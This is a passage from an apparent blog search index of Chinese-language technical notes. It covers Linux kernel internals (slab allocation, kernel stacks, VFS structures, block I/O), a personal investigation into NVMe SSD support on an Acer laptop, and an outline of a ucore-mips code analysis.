<p>align\u4e3a\u7b2c\u4e00\u4e2a\u5bf9\u8c61\u7684\u504f\u79fb\uff0c\u901a\u5e38\u4e3a0</p> </li> <li> <p>flags</p> <ul> <li>SLAB_HWCACHE_ALGIN\uff1a\u547d\u4ee4slab\u5c42\u628a\u6bcf\u4e00\u4e2a\u5bf9\u8c61\u6309cache line\u5bf9\u9f50\uff0c\u9632\u6b62\u4e24\u4e2a\u5bf9\u8c61\u5730\u5740\u4e0d\u540c\u4f46\u6620\u5c04\u5230\u76f8\u540c\u7684cache line</li> </ul> <p>\u6ce8\uff1a\u4e0d\u592a\u660e\u767d\uff0ccache line\u5927\u5c0f\u5bf9\u9f50\u4e0d\u4ecd\u7136\u4f1a\u6620\u5c04\u51b2\u7a81\u5417\uff1f</p> <ul> <li> <p>SLAB_POISON\uff1a\u4f7f\u7528\u5df2\u77e5\u7684\u503c\u586b\u5145slab</p> </li> <li> <p>SLAB_PANIC\uff1a\u5206\u914d\u5931\u8d25\u65f6\u4f53\u5f62slab\u5c42\u3002\u5728\u8981\u6c42\u5206\u914d\u5fc5\u987b\u6210\u529f\u65f6\u6709\u7528\uff0c\u6bd4\u5982\u7cfb\u7edf\u542f\u52a8\u65f6\u5206\u914dVMA\u7ed3\u6784\u7684cache\u3002</p> </li> </ul> </li> <li> <p>\u521b\u5efacache\u540e\uff0c\u83b7\u5f97\u4e00\u4e2a\u5bf9\u8c61</p> </li> </ul> <pre><code>void *kmem_cache_alloc(kmem_cache_t *cachep, int flags)\n</code></pre> <p>\u5982\u679ccache\u4e2d\u6240\u6709slab\u90fd\u6ca1\u6709\u7a7a\u95f2\u7684\u5bf9\u8c61\uff0c\u5219\u901a\u8fc7kmem_getpages\u83b7\u53d6\u65b0\u7684\u9875\u3002</p> <pre><code>void *kmem_cache_alloc(kmem_cache_t *cachep, void *objp)\n</code></pre> </li> <li> <p>\u5185\u6838\u6808</p> <ul> <li>\u4e0d\u50cf\u7528\u6237\u8fdb\u7a0b\uff0c\u6808\u7684\u5927\u5c0f\u53ef\u4ee5\u52a8\u6001\u589e\u957f\uff0c\u5185\u6838\u6808\u7684\u5927\u5c0f\u662f\u56fa\u5b9a\u7684\u3002</li> <li>\u6bcf\u4e2a\u8fdb\u7a0b\u90fd\u6709\u4e00\u4e2a\u5185\u6838\u6808\uff08\u5185\u6838\u8fd0\u884c\u5728\u8fdb\u7a0b\u4e0a\u4e0b\u6587\uff09\uff0c\u5185\u6838\u6808\u7684\u5927\u5c0f\u4e00\u822c\u662f\u4e24\u4e2a\u9875\u3002\uff08\u53ef\u4ee5\u7f16\u8bd1\u65f6\u914d\u7f6e\u4e3a1\u4e2a\u9875\uff09</li> <li>\u5728\u8fc7\u53bb\uff0c\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u548c\u88ab\u4e2d\u65ad\u8fdb\u7a0b\u5171\u4eab\u5185\u6838\u6808\uff0c\u4e4b\u540e\u5f15\u5165\u4e86\u4e2d\u65ad\u6808\uff0c\u6bcf\u4e2a\u8fdb\u7a0b\u6709\u4e00\u4e2a\u4e2d\u65ad\u6808</li> </ul> </li>","tags":["kernel"]},{"location":"%E9%98%85%E8%AF%BB/2021/01/01/2021-01-01-linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%E9%98%85%E8%AF%BB/#\u865a\u62df\u6587\u4ef6\u7cfb\u7edf","title":"\u865a\u62df\u6587\u4ef6\u7cfb\u7edf","text":"<ul> <li>\u590d\u4e60</li> <li>\u78c1\u76d8\u7ed3\u6784<ul> <li>CHS geometry</li> <li>Logic Block Address</li> </ul> </li> <li>\u5206\u533a\u683c\u5f0f\uff1aMBR, GPT<ul> <li>MBR\u5206\u533a\u683c\u5f0f\u5728fdisk, parted\u7b49\u5de5\u5177\u4e2d\u4e00\u822c\u6807\u8bb0\u4e3ados\u683c\u5f0f</li> <li>MBR(Master boot record)\u4f4d\u4e8e\u7b2c\u4e00\u4e2a\u6247\u533a\uff0c\u56e0\u6b64\u5206\u533a\u8868\u4e0d\u80fd\u592a\u5927\uff0c\u6700\u591a\u652f\u63014\u4e2aprimary\u5206\u533a\uff0c\u5982\u679c\u9700\u8981\u591a\u4e8e4\u4e2a\u5206\u533a\uff0c\u5219\u9700\u8981\u4f7f\u7528extend\u5206\u533a+logic\u5206\u533a\u7684\u65b9\u5f0f\u3002</li> <li>MBR\u4e5f\u9650\u5236\u4e86\u6700\u5927\u53ea\u80fd\u652f\u63012TB\u7684\u78c1\u76d8</li> </ul> </li> <li> <p>\u6587\u4ef6\u7cfb\u7edf</p> </li> <li> <p>VFS\u4f5c\u7528\uff1a\u63d0\u4f9b\u7edf\u4e00\u63a5\u53e3\uff0c\u652f\u6301\u4e0d\u540c\u6587\u4ef6\u7cfb\u7edf</p> </li> <li> <p>Unix\u6587\u4ef6\u7cfb\u7edf\u91c7\u7528\u4e86\u9762\u5411\u5bf9\u8c61\u8bbe\u8ba1\u98ce\u683c\uff0c\u4f7f\u7528\u4e864\u4e2d\u4e0d\u540c\u6570\u636e\u7ed3\u6784\uff1a\u8d85\u7ea7\u5757\u3001\u7d22\u5f15\u8282\u70b9\u3001\u76ee\u5f55\u9879\u3001\u6587\u4ef6\u5bf9\u8c61\uff0c\u6bcf\u79cd\u6570\u636e\u7ed3\u6784\u90fd\u5305\u542b\u5bf9\u5176\u8fdb\u884c\u64cd\u4f5c\u7684\u51fd\u6570</p> </li> <li> <p>\u5176\u4e2d\u8d85\u7ea7\u5757\u3001\u7d22\u5f15\u8282\u70b9\u5728Unix\u98ce\u683c\u7684\u6587\u4ef6\u7cfb\u7edf\u4e2d\u6709\u5bf9\u5e94\u7684\u78c1\u76d8\u6570\u636e\u7ed3\u6784</p> </li> <li>\u5982\u679c\u8981\u652f\u6301\u975eUnix\u98ce\u683c\u7684\u6587\u4ef6\u7cfb\u7edf\uff0c\u5219\u4ecd\u7136\u9700\u8981\u5728\u5185\u5b58\u4e2d\u6784\u9020\u54cd\u5e94\u6570\u636e\u7ed3\u6784</li> <li> <p>\u5185\u5b58\u4e2d\u7684\u6570\u636e\u7ed3\u6784\u76f8\u6bd4\u78c1\u76d8\u4e2d\u7684\u4f1a\u591a\u4e00\u4e9b\u63a7\u5236\u4fe1\u606f</p> </li> <li> <p>\u8d85\u7ea7\u5757\uff1a\u5305\u542b\u6587\u4ef6\u7cfb\u7edf\u7684\u63a7\u5236\u4fe1\u606f\u3002\u4e5f\u53eb\u6587\u4ef6\u7cfb\u7edf\u63a7\u5236\u5757\u3002</p> </li> <li> <p>\u5f53\u4e00\u4e2a\u6587\u4ef6\u7cfb\u7edf\u88ab\u6302\u8f7d\u5230\u4e00\u4e2a\u76ee\u5f55\u65f6\uff0c\u5185\u6838\u901a\u8fc7alloc_super\u521b\u5efa\u8d85\u7ea7\u5757\uff0c\u5e76\u586b\u5145\u76f8\u5173\u6570\u636e\uff08\u4ece\u78c1\u76d8\u8bfb\u53d6\uff09</p> </li> <li> <p>\u7d22\u5f15\u8282\u70b9inode</p> </li> <li> <p>\u7d22\u5f15\u8282\u70b9\u5b58\u50a8\u6587\u4ef6\u7684\u5143\u6570\u636e\uff08\u5982\u63a7\u5236\u6743\u9650\uff0c\u5927\u5c0f\uff0c\u62e5\u6709\u8005\uff0c\u521b\u5efa\u65f6\u95f4\uff09</p> <ul> <li>Unix\u5c06\u6587\u4ef6\u4fe1\u606f\u548c\u6587\u4ef6\u672c\u8eab\u5206\u522b\u5b58\u50a8</li> </ul> </li> <li> <p>Unix\u98ce\u683c\u7684\u6587\u4ef6\u7cfb\u7edf\u4e2d\uff0c\u7d22\u5f15\u8282\u70b9\u5b58\u50a8\u5728\u78c1\u76d8\u5355\u72ec\u7684\u5757\u4e2d</p> <ul> <li>\u6ca1\u6709\u7d22\u5f15\u8282\u70b9\u7684\u6587\u4ef6\u7cfb\u7edf\u901a\u5e38\u5c06\u4fe1\u606f\u4f5c\u4e3a\u6587\u4ef6\u7684\u4e00\u90e8\u5206\u5b58\u50a8\u8d77\u6765</li> </ul> </li> <li> <p>\u76ee\u5f55\u88ab\u5f53\u4f5c\u4e00\u79cd\u7279\u6b8a\u7684\u6587\u4ef6\uff0c\u53ef\u4ee5\u50cf\u6587\u4ef6\u4e00\u6837\u8fdb\u884c\u64cd\u4f5c</p> </li> <li> <p>\u67e5\u627e\u6587\u4ef6</p> <p>It starts at the beginning of the path name and looks up the inode of the first directory in the path. Then it uses that inode to look up the next directory in the path. When it reachs the end, it has found the inode of the file or directory it is trying to look up. But since it needs an <code>inode</code> to get started, how does it get started with the first lookup? There is an inode pointer kept in the superblock called <code>s_mounted</code> which points at an inode structure for the filesystem. T</p> </li> <li> <p>\u76ee\u5f55\u9879dentry</p> </li> <li> <p>\u6307\u5411\u4e00\u4e2ainode</p> </li> <li> <p>\u76ee\u5f55\u9879\u7f13\u5b58dcache</p> </li> <li> <p>\u7528\u4e8e\u5feb\u901f\u8def\u5f84\u89e3\u6790</p> </li> <li> <p>\u6587\u4ef6\u5bf9\u8c61</p> </li> <li> <p>\u8fdb\u7a0b\u6253\u5f00\u4e00\u4e2a\u6587\u4ef6\u65f6\u521b\u5efa\uff0c\u5305\u542b\u6587\u4ef6\u5f53\u524d\u4f4d\u7f6e\u3001\u8bbf\u95ee\u6a21\u5f0f\u7b49\u4fe1\u606f\u3002</p> </li> <li>\u73b0\u5728\u8fd8\u4e0d\u6e05\u695a\uff0c\u6587\u4ef6\u5bf9\u8c61\u662f\u4e0d\u662f\u6bcf\u4e2a\u8fdb\u7a0b\u79c1\u6709\u7684\u3002</li> <li>\u5b9e\u73b0\u6587\u4ef6\u5171\u4eab\uff1a\u4e0d\u540c\u8fdb\u7a0b\u7684\u6587\u4ef6\u5bf9\u8c61\u53ef\u4ee5\u6307\u5411\u76f8\u540c\u7684dentry\u548cinode</li> </ul>","tags":["kernel"]},{"location":"%E9%98%85%E8%AF%BB/2021/01/01/2021-01-01-linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%E9%98%85%E8%AF%BB/#\u5757io\u5c42","title":"\u5757I/O\u5c42","text":"<ul> <li>\u5b57\u7b26\u8bbe\u5907\u592a\u7b80\u5355\uff0c\u56e0\u6b64\u6ca1\u6709\u5b50\u7cfb\u7edf\u3002\u800c\u5757\u8bbe\u5907\u6709</li> <li>\u6247\u533a\u662f\u5757\u8bbe\u5907\u7684\u6700\u5c0f\u5bfb\u5740\u5355\u5143\uff0c\u901a\u5e38\u4e3a512\u5b57\u8282\u3002</li> <li>\u53ef\u4ee5\u53eb\u505a\uff1a\u8bbe\u5907\u5757</li> <li>\u5757\u662f\u6587\u4ef6\u7cfb\u7edf\u7684\u6700\u5c0f\u5bfb\u5740\u5355\u5143\uff0c\u901a\u5e38\u4e3a512B, 1KB\u62164KB\u3002</li> <li>\u53ef\u4ee5\u53eb\u505a\uff1a\u6587\u4ef6\u5757\uff0cI/O\u5757</li> </ul>","tags":["kernel"]},{"location":"%E9%98%85%E8%AF%BB/2021/01/01/2021-01-01-linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%E9%98%85%E8%AF%BB/#\u8fdb\u7a0b\u5730\u5740\u7a7a\u95f4","title":"\u8fdb\u7a0b\u5730\u5740\u7a7a\u95f4","text":"<p>Linux\u5185\u6838\u5b8c\u5168\u6ce8\u91ca-0.12-v5.0-\u8d75\u70af - \u6c47\u7f16\u4e2d\u4efb\u4f55\u4e00\u4e2a\u5730\u5740\u5f15\u7528\u90fd\u53ef\u8868\u793a\u4e3a\u8be5\u6587\u4ef6\u4e2d{\u533a\u5730\u5740 + \u504f\u79fb}\u6216\u8005\u7edd\u5bf9\u5730\u5740\u3002\u524d\u4e00\u79cd\u6709\u5229\u4e8e\u94fe\u63a5\u65f6\u7684\u91cd\u5b9a\u4f4d - &gt; \u7a0b\u5e8f\u5458\u4f7f\u7528\u7b26\u53f7\u6765\u547d\u540d\u5bf9\u8c61\uff0c\u94fe\u63a5\u5668\u4f7f\u7528\u7b26\u53f7\u8fdb\u884c\u94fe\u63a5\u64cd\u4f5c\uff0c\u800c\u8c03\u8bd5\u5668\u5229\u7528\u7b26\u53f7\u8fdb\u884c\u8c03\u8bd5</p>","tags":["kernel"]},{"location":"%E6%8A%98%E8%85%BE/2021/02/08/2021-02-08-%E6%9B%B4%E6%96%B0%E5%9B%BA%E6%80%81%E4%B9%8B%E6%97%85/","title":"\u66f4\u65b0\u56fa\u6001\u4e4b\u65c5","text":"<p>\u6211\u59d0\u7684\u7535\u8111\u662f15-16\u5e74\u4e70\u7684\uff0c\u578b\u53f7\u4e3aAcer Aspire V15 Nitro Black Edition(\u6697\u5f71\u9a91\u58eb2\uff0c\u7cbe\u786e\u578b\u53f7\u4e3aAspire VN7-592G-58NG)\uff0cZOL\u4e0a\u7684\u5546\u54c1\u4fe1\u606f</p> <p>\u4e0d\u5f97\u4e0d\u8bf4\u8fd9\u53f0\u7535\u8111\u786e\u5b9e\u662f\u975e\u5e38\u5389\u5bb3\u4e86\uff0c\u6709\u4ee5\u4e0b\u8fd9\u4e9b\u4eae\u773c\u7684\u5730\u65b9\u3002</p> <ul> <li>i5-6300HQ\u3002HQ\u8868\u793a\u6807\u538b-\u56db\u6838\u3002</li> <li>NIVIDIA\u7684GTX960M\u72ec\u7acb\u663e\u5361\u3002\uff08\u5f53\u65f6\u7684\u4e2d\u7aef\u4e3b\u6d41\u663e\u5361\uff09</li> </ul> <p>\u4e0b\u9762\u8fd9\u4e9b\u5373\u4f7f\u662f\u73b0\u5728\u4e5f\u662f\u5b8c\u5168\u591f\u7528\u7684\uff0c\u7279\u522b\u662f\u90a3\u4e2a\u652f\u63012x2 MU-MIMO\u7684\u65e0\u7ebf\u7f51\u5361\u3002</p> <ul> <li>Realtek 8168/8111 \u5343\u5146\u4ee5\u592a\u7f51\u5361\u3002</li> <li>Qualcommm Atheros NFA344A \u65e0\u7ebf\u7f51\u5361\u3002\uff08\u652f\u63012x2 MU-MIMO\uff0cWifi4, Wifi5\uff09https://oemdrivers.com/network-qualcomm-atheros-qca61x4a-wireless</li> <li>1\u4e2aUSB 2.0\uff0c 2\u4e2aUSB 3.0\uff0c1\u4e2aThunderbolt 3\u63a5\u53e3\u3002s</li> </ul> <p>\u800c\u4e0d\u4ec5\u9650\u4e8e\u6b64\uff0c\u8fd9\u53f0\u7535\u8111\u7684\u6269\u5c55\u6027\u662f\u771f\u7684\u975e\u5e38\u4e0d\u9519\u3002</p> <ul> <li>2\u6761\u5185\u5b58\u6761\u63d2\u69fd\u3002\u652f\u6301\u6700\u592732G\uff08\u539f\u88c5\u4e86\u4e00\u6761\u6d77\u529b\u58eb\u76844GB DDR4 2133MHz \u5185\u5b58\u6761\uff09</li> <li>\u4e00\u4e2am.2\u63d2\u69fd\uff0c\u652f\u6301NVMe\u534f\u8bae\uff08PCIe Gen3x4\uff0c\u6700\u9ad84GB/s\uff09\u3002</li> </ul> <p>\u4e0b\u9762\u662f\u53d1\u73b0\u8fd9\u53f0\u7535\u8111\u652f\u6301NVMe\u534f\u8bae\u7684\u56fa\u6001\u7684\u66f2\u6298\u8fc7\u7a0b\uff1a</p> <p>\u5728\u9605\u8bfb\u4e4b\u524d\uff0c\u9700\u8981\u4ee5\u4e0b\u77e5\u8bc6\uff1a</p> <ul> <li>m.2\u63a5\u53e3\uff08\u4e5f\u53ebNGFF(Next Generation Form Factor)\uff09</li> <li>NVMe</li> </ul> <p>\u5728\u62c6\u673a\u540e\u53d1\u73b0\u7535\u8111\u6709m.2\u63a5\u53e3\uff0c\u5982\u56fe\uff1a</p> <p></p> <p>\u6b64\u65f6\uff0c\u5929\u771f\u7684\u4ee5\u4e3a\u6709m.2 \u63a5\u53e3\u5c31\u662f\u8981\u4e70NVMe\u7684\u56fa\u6001\u786c\u76d8\u3002\u5728\u7ecf\u8fc7\u641c\u7d22\u540e\u624d\u77e5\u9053m.2\u63a5\u53e3\u7684\u4e5f\u6709SATA\u7248\u672c\u7684\u56fa\u6001\u786c\u76d8\u3002\u7136\u540e\u5c31\u9762\u4e34\u7740\u5982\u4f55\u53bb\u786e\u8ba4\u81ea\u5df1\u7535\u8111\u7684m.2\u63a5\u53e3\u662f\u5426\u652f\u6301NVMe\u534f\u8bae\u7684\u95ee\u9898\u3002\uff08\u56e0\u4e3aNVMe\u7684\u5feb\u975e\u5e38\u591a\uff09</p> <p>\u6b64\u65f6\u76f4\u63a5\u53bb\u641c\u7d22\u201c\u5982\u4f55\u786e\u8ba4\u81ea\u5df1\u7535\u8111\u662f\u5426\u652f\u6301NVMe\u201d\u8fd9\u4e2a\u95ee\u9898\uff0c\u53ef\u80fd\u4f1a\u5f97\u5230\u8fd9\u4e9b\u7b54\u6848\uff08\u5176\u5b83\u7b54\u6848\u53c2\u8003\u6027\u4e0d\u662f\u5f88\u5927\uff09</p> <ul> <li>m.2\u63a5\u53e3\u5206\u4e3aB key\u548cM key\u7684\u5f62\u72b6\uff08\u7f3a\u53e3\u5728\u5de6\u8fb9\u548c\u7f3a\u53e3\u5728\u53f3\u8fb9\uff09\u3002B key\u7684\u8d70\u7684\u662fSATA\u901a\u9053\uff0c\u4e0d\u652f\u6301\u3002M key\u7684\u53ef\u80fd\u652f\u6301\uff0c\u770b\u4e3b\u677f\u4e0am.2\u63a5\u53e3\u65c1\u8fb9\u662f\u5426\u6709PCIe\u7684\u6807\u8bc6\u3002</li> <li>\u770bBIOS\u662f\u5426\u6709NVMe\u76f8\u5173\u7684\u9009\u9879\u3002</li> </ul> <p>\u4f46\u662f\u9057\u61be\u7684\u662f\uff0cBIOS\u4e2d\u6211\u6ca1\u6709\u770b\u5230\u76f8\u5173\u8bbe\u7f6e\uff0c\u4e5f\u6ca1\u770b\u5230PCIe\u7684\u6807\u8bc6\u3002</p> <p>\u5728\u8fdb\u884c\u4e0a\u4e00\u6b65\u7684\u540c\u65f6\uff0c\u6211\u4e5f\u53bbAcer\u652f\u6301\u7f51\u7ad9](https://www.acer.com.cn/support.html?type=1)\u641c\u7d22\u4e86\u4ea7\u54c1\u4fe1\u606f\u3002</p> <p>\u8fd9\u91cc\u53ef\u4ee5\u627e\u5230\u9a71\u52a8\u7684\u6587\u4ef6\uff0c\u4e0d\u8fc7\u770b\u4e0d\u5230\u4ea7\u54c1\u7684\u8be6\u7ec6\u4fe1\u606f\u3002</p> <p></p> <p>\u7136\u540e\u5076\u7136\u53d1\u73b0\uff0c\u5728\u9999\u6e2f\u7684\u8fd9\u4e2a\u7f51\u7ad9\u662f\u53ef\u4ee5\u770b\u5230\u8bbe\u5907\u53c2\u6570\u7684</p> <p></p> <p>\u5728\u8fd9\u91cc\u9762\u786e\u5b9e\u53ef\u4ee5\u770b\u5230\u5f88\u591a\u4fe1\u606f\uff0c\u5982\u5185\u5b58\u7684\u63d2\u69fd\u6570\u91cf</p> <p></p> <p></p> <p>\u4f46\u662f\u8fd8\u662f\u627e\u4e0d\u5230\u5173\u4e8e\u90a3\u4e2am.2\u63d2\u69fd\u7684\u4fe1\u606f\u3002</p> <p>\u6b64\u65f6\u6211\u90fd\u6bd4\u8f83\u503e\u5411\u4e8e\u8ba4\u4e3a\u8fd9\u4e2am.2\u63d2\u69fd\u4e0d\u652f\u6301NVMe\u4e86\uff0c\u8fd9\u65f6\u53c8\u627e\u5230\u4e86\u4e00\u7bc7\u77e5\u4e4e\u7684\u56de\u7b54\u3002</p> <p></p> <p>\u6211\u9a6c\u4e0a\u53bb\u770b\u4e86\u4e0b\u7535\u8111\u7684\u82af\u7247\u7ec4\u578b\u53f7\u3002\u5728\u5b98\u7f51\u4e0a\u627e\u5230\u7684\u53c2\u6570\u5df2\u7ecf\u8868\u660e\u4e86\u82af\u7247\u7ec4\u4e3aintel HM170 Express\u3002\u867d\u7136\u4e0a\u9762\u7684\u77e5\u4e4e\u56de\u7b54\u5199\u4e86HM170\u652f\u6301\uff0c\u4f46\u662f\u4fdd\u9669\u8d77\u89c1\u8fd8\u662f\u53bb\u641c\u7d22\u4e00\u4e0b\u3002\u76f4\u63a5\u641c\u7d22\u82af\u7247\u578b\u53f7\uff0c\u53ef\u4ee5\u627e\u5230intel\u5b98\u7f51\u7684\u4fe1\u606f\u3002</p> <p></p> <p>\u867d\u7136\u5176\u89c4\u683c\u53c2\u6570\u91cc\u63d0\u5230\u4e86\u5f88\u591aPCIe\uff0c\u4f46\u662f\u6b64\u65f6\u6211\u5bf9\u82af\u7247\u7ec4\u7684\u6982\u5ff5\u4ee5\u53ca\u4f5c\u7528\u4e0d\u662f\u5f88\u4e86\u89e3\uff0c\u4e0d\u592a\u6e05\u695a\u5176\u548c\u56fa\u6001\u786c\u76d8\u7684\u5173\u7cfb\u3002\u6240\u4ee5\u8fd8\u662f\u4e0d\u662f\u5f88\u786e\u5b9a\u3002</p> <p>\u6700\u540e\u5728\u4e0b\u9762\u7684\u76f8\u5173\u6750\u6599\u4e2d\u627e\u5230\u4e86\u4e00\u4e2a\u66f4\u8be6\u7ec6\u7684\u6587\u6863</p> <p></p> <p>\u5176\u4e2d\u8d6b\u7136\u5199\u7740\u652f\u6301NVMe\u7684\u56fa\u6001\u786c\u76d8\u3002</p> <p></p> <p>\u6b64\u65f6\u60ac\u7740\u7684\u5fc3\u843d\u4e0b\u4e86\u4e00\u534a\uff0c\u4f46\u662f\u8fd8\u662f\u6709\u7591\u95ee\uff08\u6b64\u65f6\u6211\u5bf9\u82af\u7247\u7ec4(chipset)\u8fd8\u6709\u4e3b\u677f(motherboard)\u4e4b\u95f4\u7684\u5173\u7cfb\u4e0d\u662f\u5f88\u6e05\u695a\uff09\uff1a\u4e3b\u677f\u662fAcer\u5236\u9020\u7684\uff0c\u800c\u82af\u7247\u7ec4\u662fintel\u751f\u4ea7\u7684\u3002\u4f1a\u4e0d\u4f1a\u51fa\u73b0\u867d\u7136\u82af\u7247\u652f\u6301PCIe x4\u7684NVMe\u7684\u56fa\u6001\uff0c\u4f46\u662f\u4e3b\u677f\u628a\u8fd9\u4e2a\u529f\u80fd\u9609\u5272\u6389\u4e86\u5462\uff1f</p> <p>\u6b64\u65f6\u6211\u89c9\u5f97\u8fd8\u662f\u53bb\u641c\u7d22\u4e00\u4e0b\u522b\u4eba\u5bf9\u8fd9\u53f0\u7535\u8111\u7684\u8bc4\u6d4b\u6bd4\u8f83\u597d\u3002\u8fd9\u6b21\u6211\u76f4\u63a5\u8bd5\u7740\u7528google\u641c\u7d22\u4ee5\u4e0b\u5173\u952e\u5b57\uff08\u4e4b\u524d\u641c\u7d22\u62c6\u673a\u65b9\u6cd5\u7684\u65f6\u5019\uff0c\u4e2d\u6587\u627e\u4e0d\u5230\u592a\u591a\u4fe1\u606f\uff09\uff1a</p> <p>\"Does Apsire VN7-592G support NVMe SSD\"</p> <p>\u597d\u5bb6\u4f19\u3002\u3002\u3002</p> <p></p> <p>\u70b9\u51fb\u8fdb\u53bb\uff0c\u5c31\u770b\u5230\u8fd9\u4e48\u76f4\u63a5\u7684\u7b54\u6848\u3002\u3002\u3002</p> <p></p> <p>\u4ee5\u4e0a\u5c31\u662f\u6211\u786e\u5b9a\u8fd9\u53f0\u7535\u8111\u80fd\u5426\u88c5NVMe\u56fa\u6001\u7684\u53ca\u5176\u66f2\u6298\u7684\u8fc7\u7a0b\u3002\u7ed3\u679c\u539f\u6765\u53ea\u9700\u8981google\u4e00\u4e0b\u3002\u3002\u3002(\u8bd5\u4e86\u4e00\u4e0b\uff0c\u4e2d\u6587\u662f\u641c\u7d22\u4e0d\u5230\u7684)</p> <p>\u540e\u7eed\uff1a</p> <p>\u9646\u7eed\u641c\u7d22\u53c8\u53d1\u73b0</p> <ul> <li>BIOS\u6709bug</li> </ul> <p>https://community.acer.com/en/discussion/443066/acer-vn7-592g-nvme-support</p> <p>\u8fd9\u91cc\u786e\u8ba4\u4e86\u7535\u8111\u7684m.2\u63a5\u53e3\u652f\u6301NVMe\uff0c\u4e14m.2\u7684\u89c4\u683c\u662f80mm x 22mm</p> <p></p> <p>\u8fd9\u91cc\u63d0\u5230\u6709Bug\uff0c\u4e14\u8be5\u5e16\u5b50\u540e\u9762\u4e5f\u6ca1\u6709\u5b98\u65b9\u89e3\u51b3</p> <p></p> <p>https://community.acer.com/en/discussion/551094/acer-aspire-v-nitro-592g-ssd-m-2-or-nvme</p> <p>\u8fd9\u91cc\u8fd8\u662f\u63d0\u5230\u6709bug</p> <p></p> <ul> <li>\u53f0\u6e7e\u7684\u4e00\u4e2a\u5173\u4e8e\u5347\u7ea7NVMe SSD\u7684\u5e16\u5b50</li> </ul> <p>https://www.mobile01.com/topicdetail.php?f=232&amp;t=4728385</p> <p>\u4ed6\u8fd9\u91cc\u63d0\u5230\u652f\u6301NVMe\u7684\u4e24\u4e2a\u6761\u4ef6</p> <ol> <li> <p>\u4e3b\u677f\u7684m.2\u63a5\u53e3\u6709\u5b9e\u8d28\u7684PCIe\u7ebf\u8def</p> <p></p> <p></p> </li> <li> <p>\u7b2c\u4e8c\u70b9BIOS\u8981\u652f\u6301</p> <p></p> </li> <li> <p>\u5173\u4e8em.2\u7684slot\u662f\u5426\u652f\u6301SATA</p> </li> <li> <p>SATA\u7684SSD\u6709B key\u548cM+B key\u4e24\u79cd\uff0cNVMe\u7684SSD\u53ea\u6709M key\u4e00\u79cd</p> </li> <li> <p>m.2 m key\u65e2\u652f\u6301NVMe\uff0c\u53c8\u652f\u6301SATA\uff08\u5927\u90e8\u5206\uff09</p> </li> <li> <p>\u603b\u7ed3 m.2, SATA, PCIe, AHCI, NVMe\u7684\u81ea\u6211\u7406\u89e3\uff08\u53ef\u80fd\u4f1a\u6709\u9519\u8bef\uff0c\u66f4\u65b0\u4e2d\uff09</p> </li> <li>m.2\u3001SATA\u548cPCIe\u662f\u4e00\u79cd\u63a5\u53e3\uff0c\u8fd9\u91cc\u7684\u63a5\u53e3\u6307\u7684\u662f\u4e24\u4e2a\u7ec4\u4ef6\u7684\u8fde\u63a5\u90e8\u5206\u3002</li> <li>SATA\u548cPCIe\u4e5f\u662f\u4e00\u79cd\u603b\u7ebf\uff0c\u8fd9\u91cc\u6307\u7684\u662f\u6570\u636e\u548c\u63a7\u5236\u4fe1\u53f7\u4f20\u8f93\u7684\u901a\u8def\u3002</li> <li>AHCI\u548cNVMe\u662fprotocal\uff0c\u8fd9\u91cc\u8fd8\u4e0d\u662f\u5f88\u6e05\u695a\uff0c\u8fd9\u4e2a\u662f\u5c5e\u4e8e\u64cd\u4f5c\u7cfb\u7edf\u91cc\u7684\u9a71\u52a8\u5417\uff1f</li> <li>\u673a\u68b0\u786c\u76d8\u91c7\u7528SATA\u63a5\u53e3 +AHCI\u534f\u8bae\u3002</li> <li>\u65e9\u671f\u7684\u56fa\u6001\u4e3a\u4e86\u517c\u5bb9\u4e5f\u4f7f\u7528SATA\u63a5\u53e3\uff0c\u56e0\u6b64\u4e5f\u4f7f\u7528AHCI\u534f\u8bae\uff0c\u6700\u9ad8\u901f\u5ea6\u4e3a600MB/s\uff08SATA3\uff09</li> <li>\u7531\u4e8eAHCI\u662f\u4e3a\u673a\u68b0\u786c\u76d8\u8bbe\u8ba1\u7684\u534f\u8bae\uff0c\u4e0d\u80fd\u5145\u5206\u53d1\u6325SSD\u7684\u901f\u5ea6\u3002\u4e8e\u662f\u4e4b\u540e\u5f15\u5165\u4e86\u65b0\u7684\u534f\u8bae\u2014\u2014NVMe\uff0c\u540c\u65f6\u91c7\u7528\u4e86PCIe\u6216\u8005m.2\u7684\u63a5\u53e3\uff0c\u53ef\u4ee5\u8fbe\u5230\u66f4\u9ad8\u7684\u901f\u5ea6\u3002\u59823500MB/s</li> </ol>","tags":["\u6697\u5f71\u9a91\u58eb2","m2\u63a5\u53e3"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/","title":"ucore-mips \u4ee3\u7801\u5206\u6790","text":"<ul> <li>1. Makefile</li> <li>2. kernel_entry</li> <li>3. kern_init<ul> <li>\u6742\u9879<ul> <li>tlb_invalidate_all</li> <li>pic_init</li> <li>cons_init &amp; clock_init</li> <li>check_initrd</li> </ul> </li> <li>kprintf</li> <li>pmm_init<ul> <li>page\u7ed3\u6784\u4f53<ul> <li>\u8fd9\u91cc\u5e94\u8be5\u6709\u4e00\u4e2a\u9519\u8bef</li> </ul> </li> <li>\u7a7a\u95f2\u9875</li> <li>pmm_manager</li> <li>\u9875\u8868\u76f8\u5173\u51fd\u6570<ul> <li>get_pte</li> <li>page_insert</li> <li>page_remove</li> <li>pgdir_alloc_page</li> </ul> </li> <li>check<ul> <li>check_pgdir</li> <li>check_boot_pgdir\uff08tlb refill\u5904\u7406)</li> </ul> </li> <li>kmalloc</li> </ul> </li> <li>vmm_init<ul> <li>vma_struct</li> <li>mm_struct<ul> <li>\u5173\u952e\u51fd\u6570</li> </ul> </li> <li>check_pgfault\uff08pagefault\u7684\u5904\u7406\uff09</li> </ul> </li> <li>\u51fd\u6570\u8c03\u7528</li> <li>sched_init &amp; proc_init<ul> <li>proc_struct(\u8fdb\u7a0b\u63a7\u5236\u5757)<ul> <li>tf</li> <li>kstack</li> <li>mm</li> </ul> </li> <li>\u521b\u5efa\u5185\u6838\u7ebf\u7a0b<ul> <li>idle</li> <li>init(kernel_thread &amp; do_fork)</li> <li>user_main</li> </ul> </li> <li>\u8c03\u5ea6<ul> <li>init\u8fdb\u7a0b\u6267\u884c\u8fc7\u7a0b</li> <li>user_main\u7684\u6267\u884c\u8fc7\u7a0b</li> 